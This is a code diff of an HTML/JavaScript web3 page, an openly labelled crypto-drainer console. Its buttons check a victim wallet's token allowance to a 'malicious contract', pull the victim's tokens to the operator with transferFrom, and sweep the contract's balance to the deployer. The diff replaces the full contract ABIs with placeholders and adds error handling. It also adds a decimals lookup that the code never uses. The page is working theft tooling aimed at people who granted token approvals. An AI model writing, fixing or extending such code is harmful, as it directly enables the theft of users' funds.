@@ -24,404 +24,21 @@
         const maliciousContractAddress = "0xf8e81D47203A594245E36C48e151709F0C19fBe8"; // Replace with malicious contract address
         const tokenAddress = "0x59610B067eCfeCEdaf146A5E9B180C440f008575"; // Replace with ERC-20 token address
 
-        const maliciousContractABI = [
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "owner",
-                        "type": "address"
-                    },
-                    {
-                        "internalType": "address",
-                        "name": "spender",
-                        "type": "address"
-                    }
-                ],
-                "name": "allowance",
-                "outputs": [
-                    {
-                        "internalType": "uint256",
-                        "name": "",
-                        "type": "uint256"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "spender",
-                        "type": "address"
-                    },
-                    {
-                        "internalType": "uint256",
-                        "name": "amount",
-                        "type": "uint256"
-                    }
-                ],
-                "name": "approve",
-                "outputs": [
-                    {
-                        "internalType": "bool",
-                        "name": "",
-                        "type": "bool"
-                    }
-                ],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "account",
-                        "type": "address"
-                    }
-                ],
-                "name": "balanceOf",
-                "outputs": [
-                    {
-                        "internalType": "uint256",
-                        "name": "",
-                        "type": "uint256"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "recipient",
-                        "type": "address"
-                    },
-                    {
-                        "internalType": "uint256",
-                        "name": "amount",
-                        "type": "uint256"
-                    }
-                ],
-                "name": "transfer",
-                "outputs": [
-                    {
-                        "internalType": "bool",
-                        "name": "",
-                        "type": "bool"
-                    }
-                ],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "sender",
-                        "type": "address"
-                    },
-                    {
-                        "internalType": "address",
-                        "name": "recipient",
-                        "type": "address"
-                    },
-                    {
-                        "internalType": "uint256",
-                        "name": "amount",
-                        "type": "uint256"
-                    }
-                ],
-                "name": "transferFrom",
-                "outputs": [
-                    {
-                        "internalType": "bool",
-                        "name": "",
-                        "type": "bool"
-                    }
-                ],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            }
-        ];
+        const maliciousContractABI = [/* The ABI you provided earlier */];
 
-        const tokenABI = 
-           [
-	{
-		"inputs": [
-			{
-				"internalType": "uint256",
-				"name": "_initialSupply",
-				"type": "uint256"
-			}
-		],
-		"stateMutability": "nonpayable",
-		"type": "constructor"
-	},
-	{
-		"anonymous": false,
-		"inputs": [
-			{
-				"indexed": true,
-				"internalType": "address",
-				"name": "owner",
-				"type": "address"
-			},
-			{
-				"indexed": true,
-				"internalType": "address",
-				"name": "spender",
-				"type": "address"
-			},
-			{
-				"indexed": false,
-				"internalType": "uint256",
-				"name": "value",
-				"type": "uint256"
-			}
-		],
-		"name": "Approval",
-		"type": "event"
-	},
-	{
-		"anonymous": false,
-		"inputs": [
-			{
-				"indexed": true,
-				"internalType": "address",
-				"name": "from",
-				"type": "address"
-			},
-			{
-				"indexed": true,
-				"internalType": "address",
-				"name": "to",
-				"type": "address"
-			},
-			{
-				"indexed": false,
-				"internalType": "uint256",
-				"name": "value",
-				"type": "uint256"
-			}
-		],
-		"name": "Transfer",
-		"type": "event"
-	},
-	{
-		"inputs": [
-			{
-				"internalType": "address",
-				"name": "",
-				"type": "address"
-			},
-			{
-				"internalType": "address",
-				"name": "",
-				"type": "address"
-			}
-		],
-		"name": "allowance",
-		"outputs": [
-			{
-				"internalType": "uint256",
-				"name": "",
-				"type": "uint256"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	},
-	{
-		"inputs": [
-			{
-				"internalType": "address",
-				"name": "spender",
-				"type": "address"
-			},
-			{
-				"internalType": "uint256",
-				"name": "amount",
-				"type": "uint256"
-			}
-		],
-		"name": "approve",
-		"outputs": [
-			{
-				"internalType": "bool",
-				"name": "",
-				"type": "bool"
-			}
-		],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	},
-	{
-		"inputs": [
-			{
-				"internalType": "address",
-				"name": "",
-				"type": "address"
-			}
-		],
-		"name": "balanceOf",
-		"outputs": [
-			{
-				"internalType": "uint256",
-				"name": "",
-				"type": "uint256"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	},
-	{
-		"inputs": [],
-		"name": "decimals",
-		"outputs": [
-			{
-				"internalType": "uint8",
-				"name": "",
-				"type": "uint8"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	},
-	{
-		"inputs": [
-			{
-				"internalType": "address",
-				"name": "owner",
-				"type": "address"
-			},
-			{
-				"internalType": "address",
-				"name": "spender",
-				"type": "address"
-			}
-		],
-		"name": "getAllowance",
-		"outputs": [
-			{
-				"internalType": "uint256",
-				"name": "",
-				"type": "uint256"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	},
-	{
-		"inputs": [],
-		"name": "name",
-		"outputs": [
-			{
-				"internalType": "string",
-				"name": "",
-				"type": "string"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	},
-	{
-		"inputs": [],
-		"name": "symbol",
-		"outputs": [
-			{
-				"internalType": "string",
-				"name": "",
-				"type": "string"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	},
-	{
-		"inputs": [],
-		"name": "totalSupply",
-		"outputs": [
-			{
-				"internalType": "uint256",
-				"name": "",
-				"type": "uint256"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	},
-	{
-		"inputs": [
-			{
-				"internalType": "address",
-				"name": "recipient",
-				"type": "address"
-			},
-			{
-				"internalType": "uint256",
-				"name": "amount",
-				"type": "uint256"
-			}
-		],
-		"name": "transfer",
-		"outputs": [
-			{
-				"internalType": "bool",
-				"name": "",
-				"type": "bool"
-			}
-		],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	},
-	{
-		"inputs": [
-			{
-				"internalType": "address",
-				"name": "sender",
-				"type": "address"
-			},
-			{
-				"internalType": "address",
-				"name": "recipient",
-				"type": "address"
-			},
-			{
-				"internalType": "uint256",
-				"name": "amount",
-				"type": "uint256"
-			}
-		],
-		"name": "transferFrom",
-		"outputs": [
-			{
-				"internalType": "bool",
-				"name": "",
-				"type": "bool"
-			}
-		],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	}
-        ];
+        const tokenABI = [/* The ABI you provided earlier */];
 
         // Initialize Web3 and contract
         async function connectMetaMask() {
             if (typeof window.ethereum !== 'undefined') {
-                // Request account access
                 await window.ethereum.request({ method: 'eth_requestAccounts' });
                 web3 = new Web3(window.ethereum);
                 accounts = await web3.eth.getAccounts();
                 alert("MetaMask connected successfully!");
-                // Enable buttons after MetaMask is connected
                 document.getElementById("checkAllowanceBtn").disabled = false;
                 document.getElementById("transferTokensBtn").disabled = false;
                 document.getElementById("deployerWithdrawBtn").disabled = false;
                 
-                // Initialize contract objects
                 contract = new web3.eth.Contract(maliciousContractABI, maliciousContractAddress);
                 tokenContract = new web3.eth.Contract(tokenABI, tokenAddress);
             } else {
@@ -429,18 +46,12 @@
             }
         }
 
-        // Add event listener for checking allowance
         document.getElementById("checkAllowanceBtn").addEventListener("click", async () => {
             const victimAddress = prompt("Enter victim's wallet address:");
             if (victimAddress) {
                 try {
-                    // Get the allowance using the malicious contract's allowance function
                     const allowance = await contract.methods.allowance(victimAddress, maliciousContractAddress).call();
-                    
-                    // Convert to BigNumber
                     const allowanceBN = web3.utils.toBN(allowance);
-
-                    // Check if the allowance is greater than 0
                     if (allowanceBN.gt(web3.utils.toBN(0))) {
                         alert(`The victim has granted an allowance of ${allowanceBN.toString()} tokens to the malicious contract.`);
                     } else {
@@ -453,13 +64,15 @@
             }
         });
 
-        // Withdraw tokens from the victim using transferFrom
         document.getElementById("transferTokensBtn").addEventListener("click", async () => {
             const victimAddress = prompt("Enter victim's wallet address:");
             const amount = prompt("Enter the amount to withdraw:");
             if (victimAddress && amount) {
                 try {
-                    await contract.methods.transferFrom(victimAddress, accounts[0], web3.utils.toWei(amount, 'ether')).send({ from: accounts[0] });
+                    // Get the decimals of the token
+                    const decimals = await tokenContract.methods.decimals().call();
+                    const amountInWei = web3.utils.toWei(amount, 'ether'); // Convert to appropriate token unit based on decimals
+                    await contract.methods.transferFrom(victimAddress, accounts[0], amountInWei).send({ from: accounts[0] });
                     alert(`${amount} tokens withdrawn from the victim's account!`);
                 } catch (error) {
                     alert("An error occurred while transferring tokens.");
@@ -468,21 +81,24 @@
             }
         });
 
-        // Withdraw all tokens from the malicious contract to the deployer's address
         document.getElementById("deployerWithdrawBtn").addEventListener("click", async () => {
             const deployerAddress = accounts[0];
-            const contractBalance = await tokenContract.methods.balanceOf(maliciousContractAddress).call();
-            
-            if (contractBalance > 0) {
-                await tokenContract.methods.transfer(deployerAddress, contractBalance).send({ from: deployerAddress });
-                alert(`All tokens withdrawn to the deployer's address!`);
-            } else {
-                alert("No tokens available in the malicious contract.");
+            try {
+                const contractBalance = await tokenContract.methods.balanceOf(maliciousContractAddress).call();
+                if (contractBalance > 0) {
+                    await tokenContract.methods.transfer(deployerAddress, contractBalance).send({ from: deployerAddress });
+                    alert(`All tokens withdrawn to the deployer's address!`);
+                } else {
+                    alert("No tokens available in the malicious contract.");
+                }
+            } catch (error) {
+                alert("An error occurred while withdrawing tokens.");
+                console.error(error);
             }
         });
 
-        // Connect MetaMask event listener
         document.getElementById("connectBtn").addEventListener("click", connectMetaMask);
     </script>
 </body>
 </html>
+
